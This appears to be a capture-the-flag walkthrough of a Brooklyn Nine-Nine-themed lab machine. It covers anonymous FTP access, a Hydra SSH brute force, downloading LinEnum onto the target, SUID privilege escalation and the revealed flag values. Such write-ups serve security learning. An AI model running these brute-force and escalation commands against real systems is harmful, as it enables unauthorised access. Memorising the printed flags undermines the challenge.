

Start off with nmap default scripts (-sC), show versions (-sV) and output all formats (-oA).
`sudo nmap -sC -sV -oA nmap 10.10.136.175`

![Image 1](.attachments/Pasted image 20231123102936.png)
We have 3 ports
21: FTP server
22: SSH server
80: HTTP 

There is a file with a note for 'jake' on the FTP server and I can login anonymously. When prompted with a username, I can put 'anonymous' and leave the password empty when prompted (just press enter). 
After login, I can see there is a file there and can use the 'less' command to show the content of the text file: 
![[attachments/Pasted image 20231123103006.png)

I know now that user 'jake' has a weak password and that there are 3 users in total:
- jake
- amy
- holt
As seen in amy's message, it looks like the user holt is some sort of admin. 

After, I visited the webpage, where there is an image of Brooklyn nine nine, a television show. I googled the main character, who is called 'jake'. If I would not have found the note, I would have tried to use the username jake as well, but we know with the message on the FTP server we definitely have something here. We also find a note on the FTP server being stored there for Jake.

Now that we know the usernames, I can try to use Hydra to brute force into the SSH server. As only jake has a weak password, I will only try to brute force his credentials.

`hydra -l jake -P /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt 10.10.136.175 -t 4 ssh`

In the meantime, I also kick off a gobuster to see if we can find any other directories in the meantime.
`gobuster dir -u http://10.10.136.175 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

The gobuster didn't result into anything, but Hydra did find a password for the user jake:
![[attachments/Pasted image 20231123103050.png)

I can now login to the SSH server with: 
Username: jake
Password: 987654321
`ssh jake@10.10.136.175`

We are now logged into the SSH server!
![[attachments/Pasted image 20231123103106.png)

I can now try to move to other folders. When I move up to the home directory, the folders for amy and holt are there. If we look into holt's directory and list all files, we find 
## Flag 1 user.txt: ee11cbb19052e40b07aac0ca060c23ee
![[attachments/Pasted image 20231123103128.png)

Now I need to escalate my privileges to find the root.txt flag.
I will start getting the LinEnum package onto the SSH server. The script I used [can be found here](https://github.com/rebootuser/LinEnum.git)
Next, I setup a local webserver from where I can grab the script from within the SSH server. First move back to jake's folder, as we don't have permissions in holt's folder.
On my local terminal: `python3 -m http.server`
On the SSH server: `wget 10.10.137.228:8000/LinEnum.sh`
I now have the file, but need to make it executable first with the following command:
`chmod +x LinEnum.sh`

All steps are in the following image:
![[attachments/Pasted image 20231123103141.png)

Now I can run the LinEnum script with:
`./LinEnum.sh`

After the enumeration, I can see that there is an interesting SUID file
![[attachments/Pasted image 20231123103201.png)

Looking at [GTFO bins](https://gtfobins.github.io/), there is an exploit I can try to run to get sudo privileges:
![[attachments/Pasted image 20231123103212.png)

After running the command, **we get root access**. To now stabelize the shell and to have autocomplete, I used the following command:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

After this, I was able to access the root directory and find the second and last flag:
### **root.txt: 63a9f0ea7bb98050796b649e85481845**
![[attachments/Pasted image 20231123103222.png)

Thanks for reading!

